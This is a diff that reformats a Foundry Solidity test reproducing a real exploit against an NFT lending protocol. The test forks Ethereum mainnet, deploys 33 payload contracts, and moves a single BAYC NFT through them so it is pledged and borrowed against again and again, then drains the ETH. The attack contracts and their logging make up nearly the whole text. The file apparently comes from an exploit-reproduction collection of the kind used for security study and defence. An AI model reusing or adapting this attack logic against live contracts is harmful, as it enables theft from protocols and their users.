@@ -27,14 +27,17 @@ import "forge-std/Test.sol";
     First `Start` call : https://etherscan.io/tx/0xabfcfaf3620bbb2d41a3ffea6e31e93b9b5f61c061b9cfc5a53c74ebe890294d*/
 
 interface IBAYC {
+
     function setApprovalForAll(address operator, bool _approved) external;
 
     function transferFrom(address from, address to, uint256 tokenId) external;
 
     function ownerOf(uint256 tokenId) external view returns (address owner);
+
 }
 
 interface IXNFT {
+
     function counter() external returns (uint256); // getter() for -> uint256 public counter;
 
     function pledgeAndBorrow(
@@ -46,31 +49,26 @@ interface IXNFT {
     ) external;
 
     function withdrawNFT(uint256 orderId) external;
+
 }
 
 interface IXToken {
-    function borrow(
-        uint256 orderId,
-        address payable borrower,
-        uint256 borrowAmount
-    ) external;
+
+    function borrow(uint256 orderId, address payable borrower, uint256 borrowAmount) external;
+
 }
 
 /* Contract: 0xa04ec2366641a2286782d104c448f13bf36b2304 */
 interface INothing {
-    function borrow(
-        uint256 orderId,
-        address payable borrower,
-        uint256 borrowAmount
-    ) external;
+
+    function borrow(uint256 orderId, address payable borrower, uint256 borrowAmount) external;
+
 }
 
 /* Contract: 0x2d6e070af9574d07ef17ccd5748590a86690d175 */
 contract payloadContract is Test {
-    event OwnershipTransferred(
-        address indexed previousOwner,
-        address indexed newOwner
-    );
+
+    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
 
     uint256 orderId = 0;
     IBAYC BAYC = IBAYC(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);
@@ -103,20 +101,21 @@ contract payloadContract is Test {
         payable(msg.sender).transfer(address(this).balance);
     }
 
-    function onERC721Received(
-        address operator,
-        address from,
-        uint256 tokenId,
-        bytes calldata data
-    ) external pure returns (bytes4) {
+    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
+        external
+        pure
+        returns (bytes4)
+    {
         return this.onERC721Received.selector;
     }
 
     receive() external payable {}
+
 }
 
 /* Contract: 0xf70f691d30ce23786cfb3a1522cfd76d159aca8d */
 contract mainAttackContract is Test {
+
     address payable[33] public payloads;
     address attacker = 0xb7CBB4d43F1e08327A90B32A8417688C9D0B800a;
     IBAYC BAYC = IBAYC(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);
@@ -125,11 +124,7 @@ contract mainAttackContract is Test {
         vm.createSelectFork("mainnet", 15_028_846); // fork mainnet at block 15028846
 
         vm.deal(address(this), 0);
-        emit log_named_decimal_uint(
-            "[*] Attacker Contract ETH Balance",
-            address(this).balance,
-            18
-        );
+        emit log_named_decimal_uint("[*] Attacker Contract ETH Balance", address(this).balance, 18);
 
         // Mainnet TxID: 0x7cd094bc34c6700090f88950ab0095a95eb0d54c8e5012f1f46266c8871027ff
         emit log_string("\tAttacker send BAYC#5110 to Attack Contract...");
@@ -152,10 +147,7 @@ contract mainAttackContract is Test {
             payloads[i] = payable(address(payload));
 
             BAYC.transferFrom(address(this), address(payloads[i]), 5110);
-            require(
-                BAYC.ownerOf(5110) == payloads[i],
-                "BAYC#5110 Transfer Failed"
-            );
+            require(BAYC.ownerOf(5110) == payloads[i], "BAYC#5110 Transfer Failed");
 
             payload.makePledge();
         }
@@ -165,18 +157,13 @@ contract mainAttackContract is Test {
 
         emit log_string("[Exploit] Dumping ETH from borrow...");
         for (uint8 i = 0; i < payloads.length; ++i) {
-            (bool success, ) = payloads[i].call(
-                abi.encodeWithSignature("dumpETH()")
-            );
+            (bool success,) = payloads[i].call(abi.encodeWithSignature("dumpETH()"));
         }
 
         emit log_string("[*] Exploit Execution Completed!");
-        emit log_named_decimal_uint(
-            "[*] Attacker Contract ETH Balance",
-            address(this).balance,
-            18
-        );
+        emit log_named_decimal_uint("[*] Attacker Contract ETH Balance", address(this).balance, 18);
     }
 
     receive() external payable {}
+
 }
